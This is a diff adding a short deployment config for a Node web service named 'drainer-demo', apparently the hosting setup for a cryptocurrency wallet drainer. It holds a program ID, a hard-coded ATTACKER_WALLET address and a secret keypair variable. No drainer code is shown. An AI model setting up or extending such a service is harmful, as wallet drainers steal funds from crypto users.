@@ -1,0 +1,18 @@
+services:
+  - type: web
+    name: drainer-demo
+    runtime: node
+    plan: free
+    buildCommand: npm install
+    startCommand: npm start
+    envVars:
+      - key: NODE_VERSION
+        value: 20
+      - key: RPC_URL
+        sync: false
+      - key: PROGRAM_ID
+        value: DBueKxJaAyKYHyP3bbQE5eEMHLN7ZQfX2PyT7uw2xFhU
+      - key: ATTACKER_WALLET
+        value: DGtkrQpytKyzCaCALPAmCFuNeLLP2ScSeYxDMSa4T8gT
+      - key: WALLET_KEYPAIR_JSON
+        sync: false
